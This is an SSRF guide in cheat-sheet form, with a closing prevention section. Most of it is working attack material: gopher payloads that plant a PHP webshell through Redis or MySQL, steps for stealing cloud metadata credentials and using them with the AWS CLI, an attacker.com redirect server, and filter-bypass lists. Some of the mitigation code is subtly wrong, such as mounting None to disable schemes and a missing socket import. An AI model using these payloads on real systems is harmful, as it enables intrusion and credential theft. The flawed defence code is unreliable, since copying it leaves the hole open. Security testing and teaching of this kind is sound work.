# Server-Side Request Forgery (SSRF) - Comprehensive Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Attack Mechanics](#attack-mechanics)
3. [Detection Techniques](#detection-techniques)
4. [Scanning Tools](#scanning-tools)
5. [Exploitation Scenarios](#exploitation-scenarios)
6. [Cloud-Specific Attacks](#cloud-specific-attacks)
7. [Protocol Smuggling](#protocol-smuggling)
8. [Bypass Techniques](#bypass-techniques)
9. [Prevention & Mitigation](#prevention--mitigation)

---

## Introduction

Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain, often targeting internal resources.

**Impact**:
- Access to internal services (databases, admin panels)
- Cloud metadata exploitation (AWS, Azure, GCP credentials)
- Port scanning internal network
- Bypass firewall/network segmentation
- Remote Code Execution (in combination with other vulns)
- Denial of Service

**Common Vulnerable Features**:
- Webhooks
- PDF generators from URL
- Image/video processing from URL
- File import from URL
- URL preview/unfurling
- RSS feed readers
- API integrations

---

## Attack Mechanics

### Basic SSRF Flow

```
1. User provides URL to application
2. Application makes request to that URL (server-side)
3. Attacker provides internal/cloud metadata URL
4. Application requests internal resource
5. Response may be visible to attacker
```

### Target Categories

**Internal Services**:
```
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://10.0.0.0/8    (Private network)
http://172.16.0.0/12 (Private network)
http://192.168.0.0/16 (Private network)
```

**Cloud Metadata**:
```
AWS:    http://169.254.169.254/latest/meta-data/
Azure:  http://169.254.169.254/metadata/instance?api-version=2021-02-01
GCP:    http://metadata.google.internal/computeMetadata/v1/
```

**Internal DNS**:
```
http://internal-api/
http://admin.internal/
http://database.local/
```

---

## Detection Techniques

### Manual Testing

**Step 1: Identify URL Parameters**
```
Look for parameters accepting URLs:
- url=, uri=, path=, dest=, redirect=
- website=, link=, src=, source=
- file=, feed=, host=, port=
- callback=, webhook=, api_url=
```

**Step 2: Test with External URL**

```bash
# Provide your server URL
url=http://attacker.com/ssrf-test

# Check if your server receives request
# Start listener: python3 -m http.server 8000

# If you see request → SSRF possible
```

**Step 3: Test Internal Access**

```bash
# Try localhost
url=http://localhost/
url=http://127.0.0.1/

# Try admin panel
url=http://localhost/admin
url=http://127.0.0.1:8080/admin

# Try cloud metadata
url=http://169.254.169.254/latest/meta-data/
```

**Step 4: Blind SSRF Detection**

```bash
# DNS interaction (Burp Collaborator)
url=http://BURP-COLLABORATOR-ID.burpcollaborator.net

# Check Collaborator for DNS/HTTP request
# If request received → Blind SSRF
```

### Response Analysis

**Indicators of SSRF**:
```
- Different response for internal vs external URLs
- Response contains internal data
- Time differences (internal faster than external)
- DNS resolution errors
- Connection timeout patterns
- HTTP status code differences
```

---

## Scanning Tools

### 1. SSRFmap

```bash
# Basic scan
python ssrfmap.py -r request.txt -p url

# Specify parameter
python ssrfmap.py -r request.txt -p url

# Read files module
python ssrfmap.py -r request.txt -p url -m readfiles

# Port scan module
python ssrfmap.py -r request.txt -p url -m portscan

# Target localhost
python ssrfmap.py -r request.txt -p url -l localhost

# Target specific host
python ssrfmap.py -r request.txt -p url -l 192.168.1.10

# AWS metadata exploitation
python ssrfmap.py -r request.txt -p url -m aws

# Custom payloads
python ssrfmap.py -r request.txt -p url --payloads payloads.txt

# Verbose
python ssrfmap.py -r request.txt -p url -v

# request.txt format (saved from Burp):
POST /fetch HTTP/1.1
Host: target.com
Content-Type: application/json

{"url":"http://example.com"}
```

### 2. Gopherus

Generates Gopher protocol payloads for SSRF exploitation.

```bash
# MySQL exploitation
gopherus --exploit mysql

# PostgreSQL
gopherus --exploit postgresql

# FastCGI
gopherus --exploit fastcgi

# Redis
gopherus --exploit redis

# SMTP
gopherus --exploit smtp

# Zabbix
gopherus --exploit zabbix

# Example usage:
gopherus --exploit mysql
# Enter MySQL command: SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
# Generates gopher:// URL to execute via SSRF
```

### 3. Burp Suite

**Manual Testing**:
```
1. Identify URL parameter
2. Send to Repeater
3. Test with Collaborator URL
4. Test with localhost variants
5. Test with cloud metadata
6. Analyze responses
```

**Collaborator**:
```
1. Right-click → Insert Collaborator payload
2. Send request
3. Check Collaborator for interactions
```

**Extensions**:
- **Collaborator Everywhere**: Automatic SSRF detection
- **SSRFDetector**: Dedicated SSRF scanner
- **param Miner**: Discover hidden parameters

### 4. Interactsh

Open-source alternative to Burp Collaborator.

```bash
# Start client
interactsh-client

# Get unique URL (e.g., abc123.interact.sh)
# Use in SSRF testing: url=http://abc123.interact.sh

# Monitor for interactions
# Shows DNS, HTTP, SMTP interactions
```

### 5. ffuf

```bash
# Port scanning via SSRF
ffuf -u "https://target.com/fetch?url=http://127.0.0.1:FUZZ" \
     -w ports.txt

# Internal IP scanning
ffuf -u "https://target.com/fetch?url=http://192.168.1.FUZZ" \
     -w <(seq 1 255)

# Filter by response size/time
ffuf -u "https://target.com/fetch?url=http://127.0.0.1:FUZZ" \
     -w ports.txt -fs 1234

# Common ports wordlist
echo -e "22\n80\n443\n3306\n5432\n6379\n8080\n8443\n9200" > ports.txt
```

### 6. Manual Tools

**curl**:
```bash
# Test SSRF
curl "https://target.com/fetch?url=http://127.0.0.1"

# Test cloud metadata
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# POST request
curl -X POST https://target.com/api/import \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost/admin"}'
```

**Python Script**:
```python
import requests

targets = [
    "http://localhost",
    "http://127.0.0.1",
    "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/"
]

for target in targets:
    r = requests.post('https://target.com/api/fetch',
                      json={'url': target})
    print(f"{target}: {len(r.text)} bytes")
    if 'ami-id' in r.text or 'admin' in r.text:
        print(f"[+] Interesting response from {target}")
```

---

## Exploitation Scenarios

### Scenario 1: Access Internal Admin Panel

```bash
# Application: https://public.com/fetch?url=X

# Attempt 1: Direct localhost
url=http://localhost/admin
→ Response: Forbidden or filtered

# Attempt 2: IP variations
url=http://127.0.0.1/admin
url=http://0.0.0.0/admin
url=http://[::1]/admin (IPv6 localhost)

# Attempt 3: Decimal/Octal/Hex IP
url=http://2130706433/admin (127.0.0.1 in decimal)
url=http://0x7f000001/admin (127.0.0.1 in hex)
url=http://0177.0.0.1/admin (Octal)

# Success: Access admin panel meant for localhost only
```

### Scenario 2: Port Scanning Internal Network

```bash
# Scan common ports on internal host
url=http://192.168.1.10:22     # SSH
url=http://192.168.1.10:80     # HTTP
url=http://192.168.1.10:3306   # MySQL
url=http://192.168.1.10:6379   # Redis
url=http://192.168.1.10:9200   # Elasticsearch

# Analyze responses:
# - Open port: Connection successful / HTTP response
# - Closed port: Connection refused (fast)
# - Filtered port: Timeout (slow)

# Automate with script or ffuf
```

### Scenario 3: Read Local Files (via protocols)

```bash
# file:// protocol
url=file:///etc/passwd
url=file:///C:/Windows/win.ini

# dict:// protocol
url=dict://localhost:6379/INFO

# gopher:// protocol (arbitrary TCP)
url=gopher://localhost:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
```

### Scenario 4: Exploit Internal Redis (No Auth)

```bash
# Step 1: Generate Gopher payload with Gopherus
gopherus --exploit redis

# Enter Redis commands to write shell:
config set dir /var/www/html
config set dbfilename shell.php
set test "<?php system($_GET['cmd']); ?>"
save

# Step 2: Get generated Gopher URL
gopher://127.0.0.1:6379/_[encoded_payload]

# Step 3: Execute via SSRF
url=gopher://127.0.0.1:6379/_[encoded_payload]

# Step 4: Access shell
https://target.com/shell.php?cmd=id
```

### Scenario 5: SSRF to RCE via ImageMagick

```bash
# If application uses ImageMagick to process images from URL

# Create malicious SVG (push exploit)
<image>
  <read filename="text:http://localhost/admin" />
  <write filename="admin.txt" />
</image>

# Or use file:// to read files
<image>
  <read filename="file:///etc/passwd" />
  <write filename="passwd.txt" />
</image>

# ImageMagick will process, potentially leading to RCE
```

---

## Cloud-Specific Attacks

### AWS EC2 Metadata

**Metadata Endpoint**:
```
http://169.254.169.254/latest/meta-data/
```

**Extraction Steps**:
```bash
# Step 1: Access metadata
url=http://169.254.169.254/latest/meta-data/

# Response lists available data:
# ami-id
# hostname
# iam/
# instance-id
# public-keys/

# Step 2: Get IAM role name
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Response: role-name

# Step 3: Get IAM credentials
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

# Response (JSON):
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}

# Step 4: Use credentials with AWS CLI
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws s3 ls
aws ec2 describe-instances
```

**IMDSv2 (Requires Token)**:
```bash
# Step 1: Get token (requires PUT request)
# Some SSRF don't support PUT, but try:
curl -X PUT "http://169.254.169.254/latest/api/token" \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: TOKEN" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 bypass: If PUT not supported, try IMDSv1 fallback
url=http://169.254.169.254/latest/meta-data/  # May still work
```

### Azure Instance Metadata

**Endpoint**:
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**Extraction**:
```bash
# Requires header: Metadata: true

# If SSRF allows custom headers:
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
header=Metadata: true

# Response contains:
# - compute (VM info)
# - network (networking info)

# Access Azure credentials
url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
header=Metadata: true

# Response: access_token for Azure Resource Manager
```

### Google Cloud Metadata

**Endpoint**:
```
http://metadata.google.internal/computeMetadata/v1/
```

**Extraction**:
```bash
# Requires header: Metadata-Flavor: Google

url=http://metadata.google.internal/computeMetadata/v1/
header=Metadata-Flavor: Google

# Get instance info
url=http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true
header=Metadata-Flavor: Google

# Get service account token
url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
header=Metadata-Flavor: Google

# Response: access_token for GCP API
```

### DigitalOcean Metadata

```bash
url=http://169.254.169.254/metadata/v1/
url=http://169.254.169.254/metadata/v1/user-data
```

### Oracle Cloud Metadata

```bash
url=http://192.0.0.192/latest/meta-data/
```

---

## Protocol Smuggling

### Gopher Protocol

Allows sending arbitrary TCP data.

**Format**:
```
gopher://<host>:<port>/_<URL-encoded-data>
```

**Redis Example**:
```bash
# Redis command: SET key value
# Gopher payload:
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$3%0d%0akey%0d%0a$5%0d%0avalue%0d%0a

# Breakdown:
*3         # 3 elements
$3 SET     # "SET" (3 chars)
$3 key     # "key" (3 chars)
$5 value   # "value" (5 chars)
%0d%0a     # CRLF
```

**MySQL Example (via Gopherus)**:
```bash
gopherus --exploit mysql
# Enter query: SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
# Get Gopher URL, use in SSRF
```

### File Protocol

```bash
# Read local files
file:///etc/passwd
file:///C:/Windows/win.ini
file:///proc/self/environ

# Can also read from network (SMB on Windows)
file://192.168.1.10/share/file.txt
```

### Dict Protocol

```bash
# Query services
dict://localhost:6379/INFO
dict://localhost:11211/stats
```

### LDAP Protocol

```bash
# LDAP queries
ldap://localhost:389/dc=example,dc=com
```

### TFTP Protocol

```bash
# Trivial FTP
tftp://192.168.1.10/config.txt
```

---

## Bypass Techniques

### 1. Localhost Bypasses

```bash
# Standard
http://localhost/
http://127.0.0.1/

# IPv6
http://[::1]/
http://[::ffff:127.0.0.1]/

# Decimal IP
http://2130706433/ (127.0.0.1)

# Octal IP
http://0177.0.0.1/
http://017700000001/

# Hexadecimal IP
http://0x7f.0x0.0x0.0x1/
http://0x7f000001/

# Mixed formats
http://0x7f.0.0.1/

# Domain resolving to localhost
http://localtest.me/  (resolves to 127.0.0.1)
http://vcap.me/
http://lvh.me/
http://anything.127.0.0.1.nip.io/
```

### 2. Blacklist Bypasses

**If "169.254.169.254" is blocked**:
```bash
# Decimal
http://2852039166/

# Hex
http://0xa9.0xfe.0xa9.0xfe/
http://0xa9fea9fe/

# Octal
http://0251.0376.0251.0376/

# Mixed
http://169.254.0xa9.0xfe/

# Domain resolution
http://169.254.169.254.nip.io/
http://metadata.nicob.net/  # Resolves to 169.254.169.254

# URL encoding
http://169.254.169.254/      → http://%31%36%39.%32%35%34.%31%36%39.%32%35%34/
```

**If protocol is filtered**:
```bash
# Case variation
HTTP://
Http://
HTtp://

# Whitespace/encoding
http%3A%2F%2Flocalhost/
http://%09localhost/

# Unicode
http://localhost/ → http://\u006Cocalhost/
```

### 3. DNS Rebinding

**Attack Flow**:
1. Register domain (e.g., evil.com)
2. Configure DNS with low TTL
3. First resolution: evil.com → attacker-ip
4. Application validates: attacker-ip is external (allowed)
5. Change DNS: evil.com → 127.0.0.1
6. Application makes actual request: goes to localhost

**Tools**:
- **DNSRebinding Toolkit**
- **singularity** (automated DNS rebinding)

```bash
# Example using rebind.network
url=http://7f000001.1time.169.254.169.254.1time.repeat.rebind.network/

# Resolves to 127.0.0.1 first, then 169.254.169.254
```

### 4. Redirect-Based Bypass

```bash
# If external URLs allowed, but not internal

# Step 1: Host redirect on your server
# redirect.php:
<?php header('Location: http://127.0.0.1/admin'); ?>

# Step 2: SSRF to your redirect
url=http://attacker.com/redirect.php

# Server follows redirect to internal resource
```

**HTTP 30x Redirects**:
```python
# Python Flask redirect server
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/')
def redir():
    return redirect('http://169.254.169.254/latest/meta-data/', code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

### 5. CRLF Injection in URL

```bash
# Inject CRLF to add headers or change request
url=http://localhost%0d%0aHeader:%20value/path

# Can smuggle requests or bypass checks
```

### 6. URL Parser Confusion

```bash
# Confuse URL parsers
http://evil.com@localhost/
http://localhost#@evil.com/
http://evil.com#@localhost/

# Some parsers extract "evil.com", some extract "localhost"
# If validation and request use different parsers → bypass
```

---

## Prevention & Mitigation

### 1. Whitelist Allowed Domains

```python
# Python example
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['example.com', 'api.trusted.com']

url = request.POST.get('url')
parsed = urlparse(url)

if parsed.hostname not in ALLOWED_DOMAINS:
    return "Domain not allowed"

# Make request
response = requests.get(url)
```

### 2. Block Private IP Ranges

```python
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    parsed = urlparse(url)
    hostname = parsed.hostname

    # Resolve to IP
    ip = socket.gethostbyname(hostname)
    ip_obj = ipaddress.ip_address(ip)

    # Check if private
    if ip_obj.is_private or ip_obj.is_loopback:
        return False

    # Check metadata IP
    if ip == '169.254.169.254':
        return False

    return True

# Before making request
if not is_safe_url(user_url):
    return "URL not allowed"
```

### 3. Disable Unnecessary Protocols

```python
# Only allow http/https
import requests

# Configure session
session = requests.Session()
session.mount('file://', None)  # Disable file://
session.mount('gopher://', None)  # Disable gopher://
session.mount('dict://', None)  # Disable dict://

# Only http/https work
response = session.get(user_url)
```

### 4. Use Network Segmentation

```
- Application server in DMZ
- Internal services in private network
- Firewall rules block outbound from app to internal
- Metadata endpoint firewalled (iptables)
```

**Block AWS Metadata (iptables)**:
```bash
iptables -A OUTPUT -d 169.254.169.254 -j DROP
```

### 5. Implement Proper DNS Resolution

```python
# Prevent DNS rebinding
import socket

def resolve_and_check(hostname):
    # Resolve
    ip = socket.gethostbyname(hostname)

    # Check if private
    # ...check logic...

    # Wait a bit, re-resolve
    time.sleep(1)
    ip2 = socket.gethostbyname(hostname)

    # Ensure same IP (prevent rebinding)
    if ip != ip2:
        return False

    return True
```

### 6. Response Validation

```python
# Don't return raw response to user
response = requests.get(validated_url)

# Validate response type
if 'application/json' not in response.headers.get('Content-Type', ''):
    return "Invalid response type"

# Limit response size
if len(response.content) > 1000000:  # 1MB
    return "Response too large"

# Return processed data, not raw response
return process_response(response)
```

### 7. Use Dedicated Services

```python
# Instead of fetching URL server-side, use client-side
# Or use dedicated, sandboxed microservice for URL fetching

# Dedicated service:
# - Runs in isolated environment
# - No access to internal network
# - Strict egress filtering
# - Rate limiting
```

### 8. Monitoring & Logging

```python
# Log all URL fetch attempts
logging.info(f"Fetching URL: {url} for user: {user_id}")

# Alert on suspicious patterns
if '169.254.169.254' in url:
    logging.warning(f"ALERT: Metadata access attempt by {user_id}")

if 'localhost' in url or '127.0.0.1' in url:
    logging.warning(f"ALERT: Localhost access attempt by {user_id}")
```

### Security Checklist

- [ ] Whitelist allowed domains (if possible)
- [ ] Block private IP ranges (10.x, 172.16.x, 192.168.x)
- [ ] Block localhost/loopback (127.x, ::1)
- [ ] Block cloud metadata (169.254.169.254)
- [ ] Disable unnecessary protocols (file://, gopher://, etc.)
- [ ] Validate after DNS resolution (prevent rebinding)
- [ ] Network segmentation (app cannot reach internal)
- [ ] Firewall rules block metadata access
- [ ] Rate limiting on URL fetch feature
- [ ] Logging and monitoring
- [ ] Don't return raw responses
- [ ] Response size limits
- [ ] Regular security testing

---

**Additional Resources**:
- OWASP Server-Side Request Forgery
- PortSwigger SSRF Tutorial
- HackTricks - SSRF
- PayloadsAllTheThings - SSRF
- AWS IMDSv2 Documentation
